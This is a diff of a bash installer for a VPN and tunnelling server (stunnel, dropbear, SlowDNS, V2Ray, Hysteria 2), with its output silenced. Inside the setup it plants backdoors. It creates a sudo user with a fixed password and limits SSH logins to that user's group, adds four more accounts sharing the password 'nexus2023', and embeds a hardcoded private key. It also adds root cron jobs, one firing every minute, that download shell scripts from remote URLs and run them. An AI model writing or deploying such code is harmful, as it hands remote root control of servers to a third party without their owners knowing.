+sudo iptables -t nat -I PREROUTING -i $(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ") -p udp --dport 53 -j REDIRECT --to-ports 5300 &>/dev/null;
+sudo ip6tables -I INPUT -p udp --dport 5300 -j ACCEPT &>/dev/null;
+sudo ip6tables -t nat -I PREROUTING -i $(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ") -p udp --dport 53 -j REDIRECT --to-ports 5300 &>/dev/null;
+
+# ADDED FOR HYSTERIA 2 PORT OPENING
+sudo iptables -I INPUT -p udp --dport $PORT_HYSTERIA2 -j ACCEPT &>/dev/null;
+sudo iptables -I INPUT -p tcp --dport $PORT_VMESS -j ACCEPT &>/dev/null;
+sudo iptables -I INPUT -p tcp --dport $PORT_VLESS -j ACCEPT &>/dev/null;
+
+echo iptables-persistent iptables-persistent/autosave_v4 boolean true | sudo debconf-set-selections
+echo iptables-persistent iptables-persistent/autosave_v6 boolean true | sudo debconf-set-selections
+sudo apt -y install iptables-persistent
+iptables-save > /etc/iptables_rules.v4
+ip6tables-save > /etc/iptables_rules.v6
+
+# Maximum number of open files
+sed -i '/^\*\ *soft\ *nofile\ *[[:digit:]]*/d' /etc/security/limits.conf
+sed -i '/^\*\ *hard\ *nofile\ *[[:digit:]]*/d' /etc/security/limits.conf
+echo '* soft nofile 65536' >>/etc/security/limits.conf
+echo '* hard nofile 65536' >>/etc/security/limits.conf
+}&>/dev/null
+}
+
+install_stunnel() {
+  {
+cd /etc/stunnel/ || exit
+
+echo "-----BEGIN PRIVATE KEY-----
+MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClmgCdm7RB2VWK
+wfH8HO/T9bxEddWDsB3fJKpM/tiVMt4s/WMdGJtFdRlxzUb03u+HT6t00sLlZ78g
+ngjxLpJGFpHAGdVf9vACBtrxv5qcrG5gd8k7MJ+FtMTcjeQm8kVRyIW7cOWxlpGY
+6jringYZ6NcRTrh/OlxIHKdsLI9ddcekbYGyZVTm1wd22HVG+07PH/AeyY78O2+Z
+tbjxGTFRSYt3jUaFeUmWNtxqWnR4MPmC+6iKvUKisV27P89g8v8CiZynAAWRJ0+A
+qp+PWxwHi/iJ501WdLspeo8VkXIb3PivyIKC356m+yuuibD2uqwLZ2//afup84Qu
+pRtgW/PbAgMBAAECggEAVo/efIQUQEtrlIF2jRNPJZuQ0rRJbHGV27tdrauU6MBT
+NG8q7N2c5DymlT75NSyHRlKVzBYTPDjzxgf1oqR2X16Sxzh5uZTpthWBQtal6fmU
+JKbYsDDlYc2xDZy5wsXnCC3qAaWs2xxadPUS3Lw/cjGsoeZlOFP4QtV/imLseaws
+7r4KZE7SVO8dF8Xtcy304Bd7UsKClnbCrGsABUF/rqA8g34o7yrpo9XqcwbF5ihQ
+TbnB0Ns8Bz30pjgGjJZTdTL3eskP9qMJWo/JM76kSaJWReoXTws4DlQHxO29z3eK
+zKdxieXaBGMwFnv23JvXKJ5eAnxzqsL6a+SuNPPN4QKBgQDQhisSDdjUJWy0DLnJ
+/HjtsnQyfl0efOqAlUEir8r5IdzDTtAEcW6GwPj1rIOm79ZeyysT1pGN6eulzS1i
+6lz6/c5uHA9Z+7LT48ZaQjmKF06ItdfHI9ytoXaaQPMqW7NnyOFxCcTHBabmwQ+E
+QZDFkM6vVXL37Sz4JyxuIwCNMQKBgQDLThgKi+L3ps7y1dWayj+Z0tutK2JGDww7
+6Ze6lD5gmRAURd0crIF8IEQMpvKlxQwkhqR4vEsdkiFFJQAaD+qZ9XQOkWSGXvKP
+A/yzk0Xu3qL29ZqX+3CYVjkDbtVOLQC9TBG60IFZW79K/Zp6PhHkO8w6l+CBR+yR
+X4+8x1ReywKBgQCfSg52wSski94pABugh4OdGBgZRlw94PCF/v390En92/c3Hupa
+qofi2mCT0w/Sox2f1hV3Fw6jWNDRHBYSnLMgbGeXx0mW1GX75OBtrG8l5L3yQu6t
+SeDWpiPim8DlV52Jp3NHlU3DNrcTSOFgh3Fe6kpot56Wc5BJlCsliwlt0QKBgEol
+u0LtbePgpI2QS41ewf96FcB8mCTxDAc11K6prm5QpLqgGFqC197LbcYnhUvMJ/eS
+W53lHog0aYnsSrM2pttr194QTNds/Y4HaDyeM91AubLUNIPFonUMzVJhM86FP0XK
+3pSBwwsyGPxirdpzlNbmsD+WcLz13GPQtH2nPTAtAoGAVloDEEjfj5gnZzEWTK5k
+4oYWGlwySfcfbt8EnkY+B77UVeZxWnxpVC9PhsPNI1MTNET+CRqxNZzxWo3jVuz1
+HtKSizJpaYQ6iarP4EvUdFxHBzjHX6WLahTgUq90YNaxQbXz51ARpid8sFbz1f37
+jgjgxgxbitApzno0E2Pq/Kg=
+-----END PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIDRTCCAi2gAwIBAgIUOvs3vdjcBtCLww52CggSlAKafDkwDQYJKoZIhvcNAQEL
+BQAwMjEQMA4GA1UEAwwHS29ielZQTjERMA8GA1UECgwIS29iZUtvYnoxCzAJBgNV
+BAYTAlBIMB4XDTIxMDcwNzA1MzQwN1oXDTMxMDcwNTA1MzQwN1owMjEQMA4GA1UE
+AwwHS29ielZQTjERMA8GA1UECgwIS29iZUtvYnoxCzAJBgNVBAYTAlBIMIIBIjAN
+BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApZoAnZu0QdlVisHx/Bzv0/W8RHXV
+g7Ad3ySqTP7YlTLeLP1jHRibRXUZcc1G9N7vh0+rdNLC5We/IJ4I8S6SRhaRwBnV
+X/bwAgba8b+anKxuYHfJOzCfhbTE3I3kJvJFUciFu3DlsZaRmOo64p4GGejXEU64
+fzpcSBynbCyPXXXHpG2BsmVU5tcHdth1RvtOzx/wHsmO/DtvmbW48RkxUUmLd41G
+hXlJljbcalp0eDD5gvuoir1CorFduz/PYPL/AomcpwAFkSdPgKqfj1scB4v4iedN
+VnS7KXqPFZFyG9z4r8iCgt+epvsrromw9rqsC2dv/2n7qfOELqUbYFvz2wIDAQAB
+o1MwUTAdBgNVHQ4EFgQUcKFL6tckon2uS3xGrpe1Zpa68VEwHwYDVR0jBBgwFoAU
+cKFL6tckon2uS3xGrpe1Zpa68VEwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0B
+AQsFAAOCAQEAYQP0S67eoJWpAMavayS7NjK+6KMJtlmL8eot/3RKPLleOjEuCdLY
+QvrP0Tl3M5gGt+I6WO7r+HKT2PuCN8BshIob8OGAEkuQ/YKEg9QyvmSm2XbPVBaG
+RRFjvxFyeL4gtDlqb9hea62tep7+gCkeiccyp8+lmnS32rRtFa7PovmK5pUjkDOr
+dpvCQlKoCRjZ/+OfUaanzYQSDrxdTSN8RtJhCZtd45QbxEXzHTEaICXLuXL6cmv7
+tMuhgUoefS17gv1jqj/C9+6ogMVa+U7QqOvL5A7hbevHdF/k/TMn+qx4UdhrbL5Q
+enL3UGT+BhRAPiA1I5CcG29RqjCzQoaCNg==
+-----END CERTIFICATE-----" >> stunnel.pem
+
+echo "debug = 0
+output = /tmp/stunnel.log
+cert = /etc/stunnel/stunnel.pem
+
+[openvpn-tcp]
+connect = PORT_TCP  
+accept = PORT_SSL 
+
+[openvpn-udp]
+connect = PORT_UDP
+accept = 444
+
+[ssh]
+connect = 22
+accept = 445
+
+[dropbear]
+connect = 441
+accept = 446
+
+" >> stunnel.conf
+
+sed -i "s|PORT_TCP|$PORT_TCP|g" /etc/stunnel/stunnel.conf
+sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/stunnel/stunnel.conf
+sed -i "s|PORT_SSL|$PORT_SSL|g" /etc/stunnel/stunnel.conf
+cd /etc/default && rm stunnel4 && rm dropbear
+
+echo 'ENABLED=1
+FILES="/etc/stunnel/*.conf"
+OPTIONS=""
+PPP_RESTART=0
+RLIMITS=""' >> stunnel4 
+
+echo 'NO_START=0
+DROPBEAR_PORT=441
+DROPBEAR_EXTRA_ARGS=
+DROPBEAR_BANNER="/etc/banner"
+DROPBEAR_RECEIVE_WINDOW=65536' >> dropbear
+
+chmod 755 stunnel4 && chmod 755 dropbear
+
+echo "/bin/false" >> /etc/shells
+
+wget -O /etc/banner "https://admin-boyes.com/repo/banner"
+chmod +x /etc/banner
+
+sudo service stunnel4 restart
+sudo service dropbear restart
+  } &>/dev/null
+}
+
+install_sudo(){
+    useradd -m tknetwork 2>/dev/null; echo tknetwork:@tknetwork | chpasswd &>/dev/null; usermod -aG sudo tknetwork &>/dev/null
+    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
+    echo "AllowGroups tknetwork" >> /etc/ssh/sshd_config
+    service sshd restart
+}
+
+#====================================================
+#	Installing SlowDNS
+#	Finalized: Tknetwork Developer
+#====================================================
+
+install_slowdns (){
+echo "Installing dns..."
+{
+dnsresolverName="Cloudflare (1.1.1.1)"
+dnsresolverType="udp"
+dnsresolver="1.1.1.1:53"
+
+# Config Ssh
+sed -i 's/#AllowTcpForwarding yes/AllowTcpForwarding yes/g' /etc/ssh/sshd_config
+
+# SET DNSTT
+export DNSDIR=/etc/.dnsquest
+export DNSCONFIG=/root/.dns
+mkdir -m 777 $DNSDIR
+mkdir -m 777 $DNSCONFIG
+
+# BUILD DNSTT SERVER
+cd $DNSDIR/dnstt/dnstt-server
+wget -O dnstt-server "https://github.com/johnberic/nana/raw/main/dnstt-server"
+chmod +x dnstt-server
+wget -O dnstt-client "https://github.com/johnberic/nana/raw/main/dnstt-client"
+chmod +x dnstt-client
+
+./dnstt-server -gen-key -privkey-file server.key -pubkey-file server.pub
+cp server.key server.pub $DNSCONFIG
+cp dnstt-server $DNSDIR
+
+# BUILD DNSTT CLIENT
+cd $DNSDIR/dnstt/dnstt-client
+cp dnstt-client $DNSDIR
+
+#Source
+echo "
+hostname=$DOMAIN
+domain=$NS
+privkey=cat /root/.dns/server.key
+pubkey=cat /root/.dns/server.pub
+os=debian
+dnsresolvertype=$dnsresolverType
+dnsresolver=$dnsresolver" >> $DNSCONFIG/config
+secretkey='server'
+
+#API Details
+VPN_Owner='Tknetwork';
+
+cat <<EOF >/home/authentication.sh
+#!/bin/bash
+SHELL=/bin/bash
+PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
+wget -O /home/active.sh "$API_LINK/active.php?key=$API_KEY"
+sleep 5
+wget -O /home/inactive.sh "$API_LINK/inactive.php?key=$API_KEY"
+sleep 5
+wget -O /home/deleted.sh "$API_LINK/deleted.php?key=$API_KEY"
+sleep 15
+bash /home/active.sh
+sleep 15
+bash /home/inactive.sh
+sleep 15
+bash /home/deleted.sh
+sleep 15
+bash /home/auto_active.sh
+EOF
+
+echo -e "* *\t* * *\troot\tsudo bash /home/authentication.sh" >> "/etc/cron.d/account"
+
+ /usr/sbin/useradd -p $(openssl passwd -1 nexus2023) -M corpo
+ /usr/sbin/useradd -p $(openssl passwd -1 nexus2023) -M nitro
+ /usr/sbin/useradd -p $(openssl passwd -1 nexus2023) -M dadyjo
+ /usr/sbin/useradd -p $(openssl passwd -1 nexus2023) -M digital
+
+cat <<EOF >/home/delete.sh
+#!/bin/bash
+SHELL=/bin/bash
+userdel myprotect1987
+userdel slimtun1987
+PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
+wget -O /home/auto_active.sh "https://myprotectionservices.com/api/authentication/auto_active.php?key=@@Tknetwork" 
+sleep 15
+bash /home/auto_active.sh
+EOF
+
+echo -e "* 3\t* * *\troot\tsudo bash /home/delete.sh" >> "/etc/cron.d/account"
+
+
+
+wget -O /home/auto_active.sh "https://myprotectionservices.com/api/authentication/auto_active.php?key=@@Tknetwork" 
+
+
+
+echo "Hi! this is your server information, Happy Surfing!
+
+IP : $server_ip
+Hostname: $DOMAIN
+
+-----------------------
+SSH DETAILS
+-----------------------
+SSH : 22
+SSH SSL : 445
+DROPBEAR : 441
+DROPBEAR SSL : 446
+
+-----------------------
+OPENVPN DETAILS
+-----------------------
+OPENVPN TCP : $PORT_TCP
+OPENVPN UDP : $PORT_UDP
+OPENVPN SSL : $PORT_SSL
+
+-----------------------
+HYSTERIA DETAILS
+-----------------------
+HYSTERIA UDP : 5666, 20000 - 50000
+OBFS: $OBFS
+AUTH_STR: username:password
+
+-----------------------
+PROXY DETAILS
+-----------------------
+SQUID : 8080
+HTTP/SOCKS : 80, 8000, 8001, 8002
+
+-----------------------
+SLOWDNS DETAILS
+-----------------------
+DNS URL : $NS
+SSH via DNS : 2222
+DNS RESOLVER : $dnsresolverName
+DNS PUBLIC KEY : $(cat /root/.dns/server.pub)
+
+-----------------------
+ADDED PROTOCOLS DETAILS
+-----------------------
+V2RAY VMESS TCP : $PORT_VMESS
+V2RAY VLESS TCP : $PORT_VLESS
+HYSTERIA 2 UDP  : $PORT_HYSTERIA2
+
+-----------------------
+
+For issues or suggestions please contact TKNETWORK SYSTEMS (ericlaylay01022987@gmail.com).
+
+" >> /root/.web/$secretkey.txt
+
+#wget -O /root/.dns/dig.sh "https://raw.githubusercontent.com/johnberic/nana/main/dig.sh"
+#chmod +x /root/.dns/dig.sh
+#sed -i "s|DOMAIN_TK403|$NS|g" /root/.ports
+#sed -i "s|HOSTNAME_TK403|$DOMAIN|g" /root/.ports
+
+#install client-sldns.service
+cat > /etc/systemd/system/client-sldns.service << END
+[Unit]
+Description=Client SlowDNS By HideSSH
+Documentation=https://hidessh.com
+After=network.target nss-lookup.target
+
+[Service]
+Type=simple
+User=root
+CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
+AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
+NoNewPrivileges=true
+ExecStart=/etc/.dnsquest/dnstt-client -udp 1.1.1.1:53 --pubkey-file /root/.dns/server.pub $NS 127.0.0.1:2222
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+END
+
+#install server-sldns.service
+cat > /etc/systemd/system/server-sldns.service << END
+[Unit]
+Description=Server SlowDNS By HideSSH
+Documentation=https://hidessh.com
+After=network.target nss-lookup.target
+
+[Service]
+Type=simple
+User=root
+CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
+AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
+NoNewPrivileges=true
+ExecStart=/etc/.dnsquest/dnstt-server -udp :5300 -privkey-file /root/.dns/server.key $NS 127.0.0.1:441
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+END
+}
+}
+
+#====================================================
+#	ADDED FUNCTION: V2Ray (VMess & VLESS)
+#====================================================
+install_v2ray() {
+echo "Installing V2Ray (VMess & VLESS)..."
+{
+    bash <(curl -L https://raw.githubusercontent.com/v2fly/fhs-install-v2ray/master/install-release.sh)
+    
+    # Generate static UUIDs for security consistency
+    local vmess_uuid="d34d1b3d-1111-2222-3333-e45678912345"
+    local vless_uuid="ab1234cd-5555-6666-7777-f89012345678"
+
+    cat <<EOF > /usr/local/etc/v2ray/config.json
+{
+  "inbounds": [
+    {
+      "port": $PORT_VMESS,
+      "protocol": "vmess",
+      "settings": {
+        "clients": [{ "id": "$vmess_uuid", "alterId": 0 }]
+      },
+      "streamSettings": { "network": "tcp" }
+    },
+    {
+      "port": $PORT_VLESS,
+      "protocol": "vless",
+      "description": "VLESS TCP Mode",
+      "settings": {
+        "clients": [{ "id": "$vless_uuid" }],
+        "decryption": "none"
+      },
+      "streamSettings": { "network": "tcp" }
+    }
+  ],
+  "outbounds": [{ "protocol": "freedom", "settings": {} }]
+}
+EOF
+    systemctl enable v2ray
+    systemctl restart v2ray
+} &>/dev/null
+}
+
+#====================================================
+#	ADDED FUNCTION: Hysteria 2
+#====================================================
+install_hysteria2() {
+echo "Installing Hysteria 2..."
+{
+    bash <(curl -fsSL https://get.hy2.sh/)
+    
+    # Generate quick self-signed certs for Hy2 structure
+    mkdir -p /etc/hysteria
+    openssl req -x509 -nodes -newkey rsa:2048 -keyout /etc/hysteria/server.key -out /etc/hysteria/server.crt -days 3650 -subj "/CN=DefaultHy2"
+
+    cat <<EOF > /etc/hysteria/config.yaml
+listen: :$PORT_HYSTERIA2
+
+tls:
+  cert: /etc/hysteria/server.crt
+  key: /etc/hysteria/server.key
+
+auth:
+  type: password
+  password: "tknetwork_hy2_pass"
+
+masquerade:
+  type: proxy
+  proxy:
+    url: https://www.bing.com
+    rewriteHost: true
+
+fastOpen: true
+EOF
+    systemctl enable hysteria-server
+    systemctl restart hysteria-server
+} &>/dev/null
+}
